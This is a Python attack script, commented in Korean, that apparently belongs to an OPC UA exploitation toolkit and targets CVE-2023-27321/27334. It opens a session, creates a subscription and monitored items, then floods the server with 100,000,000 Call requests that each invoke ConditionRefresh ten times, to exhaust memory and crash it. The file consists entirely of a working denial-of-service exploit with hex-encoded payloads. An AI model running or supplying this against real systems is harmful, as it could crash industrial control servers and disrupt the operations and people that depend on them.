# Uncontrolled ConditionRefresh Attack
#   MonitoredNodes.cs에서 ConditionRefresh 메소드가 무제한으로 호출될 수 있는 취약점. 이를 통해 메모리 사용량을 증가시켜 서버 충돌을 유발.
#   CVE-2023-27321 및 CVE-2023-27334에서 설명된 취약점:
#   https://files.opcfoundation.org/SecurityBulletins/OPC%20Foundation%20Security%20Bulletin%20CVE-2023-27321.pdf
#   https://industrial.softing.com/fileadmin/psirt/downloads/syt-2023-1.html

from protocol import *
from ..utils import dex

def attack(server_details, num_requests=1):
    program_type, ip_addr, port, query_string = server_details

    opcua = OPCUA(program_type=program_type, ip_addr=ip_addr, port=port, query_string=query_string)
    opcua.create_session()

    # 1 - 구독 생성
    message_header = opcua.build_opcua_message_header()
    message_body = opcua.build_opcua_message_body(type_id=1, req_id=787)  # 구독 생성 요청
    create_subscription_body = bytes.fromhex("0000000000408f40e80300000a0000000000000001ff")
    message = message_header + message_body + create_subscription_body
    print("[-] Sending MSG Request - CreateSubscription")
    create_sub_response = opcua.send_recv(message, should_recv=True)
    subscription_id = struct.unpack("<I", create_sub_response[-20: -16])[0]  # 구독 ID 추출

    # 2 - Monitored Items 생성 요청
    message_header = opcua.build_opcua_message_header()
    message_body = opcua.build_opcua_message_body(type_id=1, req_id=751)  # MonitoredItemsRequest 생성
    create_monitored_items_request = struct.pack("<I", subscription_id)
    create_monitored_items_request += dex(
        "02000000010000000100cd080c000000ffffffff0000ffffffff020000001400000000000000000000000100d7020190020000")
    create_monitored_items_request += dex(
        "130000000100f907010000000000070000004576656e7449640d000000ffffffff0100f907010000000000090000004576656e74547970650d000000ffffffff")
    create_monitored_items_request += dex("ffffffff")  # 조건절 (-1)
    create_monitored_items_request += dex("ffffffff")  # 큐 크기
    create_monitored_items_request += dex("01")  # 가장 오래된 항목 삭제 여부
    message = message_header + message_body + create_monitored_items_request
    print("[-] Sending MSG Request - Create Monitored Items Request")
    opcua.send_recv(message, count=1, should_recv=True)

    # 3 - 호출 요청 (ConditionRefresh)
    message_header = opcua.build_opcua_message_header()
    message_body = opcua.build_opcua_message_body(type_id=1, req_id=712)  # 호출 요청 생성

    methods_count = 10  # 동시 호출할 메소드 개수 설정
    single_function_call = dex("0100 de0a  0100 230f  01000000  07 ") + struct.pack("<I", subscription_id)
    methods_to_call = struct.pack("<I", methods_count) + (methods_count * single_function_call)
    message = message_header + message_body + methods_to_call

    num_times_to_send_call_packet = 100000000  # ConditionRefresh를 무제한 호출
    print(f"[-] Sending MSG Request - Create Call Request x {num_times_to_send_call_packet} times")
    opcua.send_recv(message, count=num_times_to_send_call_packet, should_recv=False)

    # 4 - 대기 후 연결 종료
    time.sleep(1000)
    print("[-] Closing connection")
    opcua.close()
